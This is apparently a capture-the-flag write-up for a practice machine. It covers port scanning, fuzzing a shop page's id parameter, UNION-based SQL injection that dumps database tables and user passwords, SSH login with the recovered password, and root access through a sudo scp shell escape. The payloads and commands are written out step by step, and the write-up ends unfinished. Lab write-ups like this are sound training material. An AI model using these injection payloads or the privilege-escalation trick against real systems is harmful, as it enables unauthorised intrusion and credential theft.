**Read the Room Description:**\
- enumerate the web application
- get credentials to the server
- find 5 flags

**Room objectives**
- Get SQL database information
- Get system version
- Get Dennis' password
- Locate flags on the system

# 1. Recon and enumeration

## 1.1 nmap
Use the nmap tool to begin building up a picture of what is running on the machine: 

```bash
sudo nmap -sV -T4 -p- $TGT
```

Options explained: -sV runs version detection, -T4 is the timing template to use (0: slowest, 5: quickest), -p- scan all ports, $TGT is the target machine IP

**nmap results:**
IMAGE NMAP RESULTS
- Port 22 open (SSH)
- Port 80 open which will host our rooms web page using Apache 2.4.18

## 1.2 View Website

We can navigate to the website in browser using the target IP `http://<TGTIP>`
IMAGE WEBSITE BLANK

From here I generally browse the website as a user would do (alongside viewing page sources) to get an idea of the websites functionality and purpose before using enumeration tools.

The main page does not offer much but directs us to an online shop that has 3 products that we can navigate to. 
IMAGE WEBPAGE SHOP

Each of these opens up in the item.php link with the `id` parameter set to a number 1,2 or 3. (for example `http://<TGTIP>/item.php?id=3`) This is worth noting as a potential point for IDOR (If you are unfamiliar with IDOR I recommend reading through [this post on infosecwriteups](https://infosecwriteups.com/what-is-idor-vulnerability-and-how-does-it-affect-you-85431d10f8fb)).

IMAGE WEBPAGE SHOP ITEM 3

From viewing the page sources we can see that the images are loaded from the assets directory but upon inspection we do not find anything of use to us.

## 1.3 Enumerate Shop ID Parameter

From section 1.2 we identified the `id` paramter on the item.php page which is worth enumerating to see we can access any other unlisted pages. To do this I used [Wfuzz](https://wfuzz.readthedocs.io/en/latest/) enumerating the parameter which a range of numbers.

I first ran this using the range 0 - 10:
```bash
wfuzz -z range,0-15 http://$TGT/item.php?id=FUZZ
```

IMAGE WFUZZ 1 to 10

Before running with a range all the way up to 100 but this time removing the values that do not return a useful page using the paramter --hl 1
```bash
wfuzz -z range,0-100 --hl 1 http://$TGT/item.php?id=FUZZ
```

IMAGE WFUZZ 1 to 100

Other than the pages we already know about we have discovered two more pages with ids 5 and 100

IMAGE RESULT 5

IMAGE RESULT 100

With an id value of 5 we have found a development page that lets us know about some blocked characters:

IMAGE BLOCKED CHARS

# 2. Exploitation

## 2.1 SQL Injection
From our objectives and a clue from the blocked charaters being common SQL command terms we will look to use the item page to perform SQL Injection.

You may have your own resources to perform SQL injection but I found these very useful to complete this room:
- [MySQL cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [Perspective Risk SQLi cheat sheet](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)

**Method:**\
- Check we are injecting commands by getting an SQL error message
- Find the number of columns needed to create a valid request
- Enumerate the database from high level down to find a password

**Getting and SQL error message**\
If we can get an error in the SQL syntax it can reveal information about the database. We know from our enumeration the the `#` comment character is blocked so I tried `\*` and recieved an error.
IMAGE SQLI ERROR

Now we have identified an area to perform an SQL injection attack and also found out that a MySQL server is running.

At this point I tried to use sqlmap to automate the injection but was not successful with the tool telling me that the target content was not stable.

**Finding the number of columns in to use**\
- We can find number of columns required by increasing the number of NULLs we use after the id value:
	- /item.php?id=100 UNION SELECT NULL
	- This returns a message `The used SELECT statements have a different number of columns`
	- IMAGE SQLI COLUMN ENUM
	- So we continue to add another NULL in the following request until we find a successful request using 5 NULL values
				-  /item.php?id=100 UNION SELECT NULL, NULL, NULL, NULL, NULL

### SQL Database Enumeration

Now that we have a vaild request we can start using our NULL columns to get information from the database. In order to get to the information we want (eventually Dennis' password) I tried to follow a logical path in my injection
	- Find version
	- Find database name
	- Find a table that is likely to hold Dennis' password
	- Find the password
 Resources I used to conduct my SQLi:
		- 

**Get version using version()**\
- /item.php?id=100 UNION SELECT VERSION(), NULL, NULL, NULL, NULL
- This didn't show anything new on the page so I put the tried it in all columns
- /item.php?id=100 UNION SELECT VERSION(), VERSION(), VERSION(), VERSION(), VERSION()
- IMAGE SQLI VERSION
- Testing the column usage I settled on using the fourth parameter going forward as it wasn't displayed with other text from the webpage

**Get database name using database() function**\
- /item.php?id=100 UNION SELECT NULL, NULL, NULL,  DATABASE(), NULL
- Shows up at x package = park package

**Get tables from park database**\
The SQL command we are looking to perform is:
```SQL
SELECT TABLE_NAME
  FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = 'my_database';
```
This gives us the following URL to try:\
- /item.php?id=100 UNION select NULL, NULL, NULL, table_name, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "park"
- IMAGE SQLI USER TABLE

This shows us there is a table called "users" in the database. To check if there are any other tables we can use the [group_concat()](https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php) function
- /item.php?id=100 UNION select NULL, NULL, NULL, group_concat(table_name), NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "park"
- IMAGE SQLI GROUP CONCAT TABLE


**Get column names names from database park and table user**\
The SQL command we are looking to perform is:
```sql
SELECT COLUMN_NAME
  FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = 'my_database' AND TABLE_NAME = 'my_table';
```

This gives us the following URL to try:\
- /item.php?id=100 UNION select NULL, NULL, NULL, group_concat(column_name), NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = "park" AND TABLE_NAME = "users"

IMAGE SQLI USER TABLE

So now we have columns id, username, password

**Get Dennis' password from User table**\
The SQL command we are looking to perform is:
```SQL
select password from users where username = "dennis"
```
However, we know from our enumeration that "username" is not allowed. My first thought was to check how many passwords there are before trying to bypass this filter so I used the following request to get all the passwords:

/item.php?id=100 UNION SELECT NULL, NULL, NULL, group_concat(password) , NULL from users

This returns only two unique passwords:

IMAGE SQLI PASSWORDS

# 3. Post Compromise Enumeration
Now that we have two passwords we can try to logon to the system using SSH and the username dennis. I tried the password "ih8dinos" first and successfully logged in where we find the first flag

IMAGE SSH FLAG 1


I ran a find command using the parameter -iname to make the search **case insensitive** picking up the next challenge flag

```bash
find / -type f -iname "flag*" 2>/dev/null
```

IMAGE SSH FLAG 2

# 4. Privilege Escalation
I ran `sudo -l` to check if Dennis could run any command as sudo

IMAGE PRIV ESC SUDO

https://gtfobins.github.io/gtfobins/scp/#sudo

``` bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

IMAGE PRIV ESC ROOT

Run find command again

IMAGE SSH FLAG 5

So where is flag 3?

Went back to Dennis 

```bash
cd /home
find . -type f -exec grep -l "flag" {} \;
```

```bash
cd /home
find . -type f -exec grep -l "flag3" {} \;
```

# TLDR
